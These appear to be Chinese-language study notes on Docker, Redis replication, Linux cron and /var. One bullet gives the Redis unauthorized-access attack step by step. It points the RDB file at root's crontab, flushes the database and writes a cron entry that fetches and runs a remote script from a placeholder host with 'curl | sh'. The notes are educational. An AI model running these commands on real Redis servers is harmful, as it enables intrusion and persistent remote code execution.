- Docker 不是虚拟机，容器中的应用都应该以前台执行，而不是像虚拟机、物理机里面那样，用 systemd 去启动后台服务，容器内没有后台服务的概念。对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。

- Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。虽然 Redi s 的读写速度都非常快，但如果当把数据都存储在单个Redis的实例中，供客户端去读取的话， 那么很有可能会产生服务器难以承受的读压力。为了缓解这样的压力，主从复制这样的机制出现了，主从模式就是指使用一个redis实例作为主机(master)，其他实例都作为从机(slave)，主机只负责写入数据，很多的从机负责读，这就很想我们常常说的 CDN 负载均衡的功能。

- redis 的攻击主要是利用 redis 的持久化存储 RDB 或者 AOF(默认不开启)，所谓持久化就是一种快照机制，用来后期恢复数据。比如 RDB 可以在一定的条件下将当前内存的数存储进一个 dump.rdb 文件中，如果下次想恢复这个数据的话，就需要将这个文件放在 redis 的快照保存目录下，替换当前的 dump.rdb 再次重启这样就能恢复原始的数据了。常见的redis 未授权RCE就是利用rdb。

  ```
  (1)修改 redis 的 rdb 文件的存放路径为 root 用户的 crontab 配置文件
  设置 dir 到定时任务目录
  config set dir "/var/spool/cron"
  设置持 rdb 文件名为root
  config set dbfilename root
  (2)使用 FLUSHALL 进行清除数据库
  127.0.0.1:6379> flushall  
  OK
  这一步主要是想清除原始 root 文件的内容，也是为了避免不必要的格式错误
  (3)在 redis 中写入我们的 cron 语句
  127.0.0.1:6379> set test "\n*/10 * * * *  curl -fsSL https://xxx.xxx.xxx.xxx/xxx/xx | sh\n"
  OK
  这里的换行符是为了实现写入时的格式良好，因为 cron 读取的时候是一行一行读取的，遇到格式不正确则丢弃
  (4)强行触发 rdb 更新
  127.0.0.1:6379> save
  至此我们的 cron 的数据就写入到了 root 用户的 cron 文件夹中了
  ```

- Redis从4.0版本开始加入了对外部扩展模块的支持。外部扩展模块可以实现新的Redis命令，新的Redis数据结构，总之基本上可以做到所有Redis内核可以做的事情。**模块的加载方式**，一种是在配置文件redis.conf中使用loadmodule /path/to/mymodule.so在Redis启动时加载。另一种方式在运行时使用命令MODULE LOAD /path/to/mymodule.so加载。加载的模块可以使用命令MODULE LIST查看，使用MODULE UNLOAD mymodule卸载。加载了模块以后我们就能直接执行我们在模块中自定义的命令了，这是不是有点像 MYSQL 的 UDF(其实就是一个道理)。**利用 Redis 主从复制来 RCE**。[1]([https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/](https://www.k0rz3n.com/2019/07/29/对一次 redis 未授权写入攻击的分析以及 redis 4.x RCE 学习/))

-  /etc/crontab 及 /var/spool/cron/\$USER 中定义定时任务的区别：/etc/crontab 只有root用户可以使用，使用时需root权限，而且**必须指定运行用户**，才会执行，e.g `*/1  *  *  *  *  *  **root** /usr/sbin/ntpdate s1a.time.edu.cn &> /dev/null`；/var/spool/cron/\$USER 所有用户都可以使用，使用crontab -u username -e命令来添加的计划任务就是直接在此文件中添加的，e.g` */1  *  *  *  *  *  /usr/sbin/ntpdate s1a.time.edu.cn &> /dev/null  `。

- linux的变量目录（/var），术语 '**var**' 是 **varible** 的简写。目录中保存的是未知增长和其内容频繁变动的文件（因此名为变化的）。'**/var/spool**' 目录用于保存等待处理的脱机文件，如mail、cron。

- Linux实际环境能用sh绝不用bash、dash等，要将sh作为默认shell，养成习惯。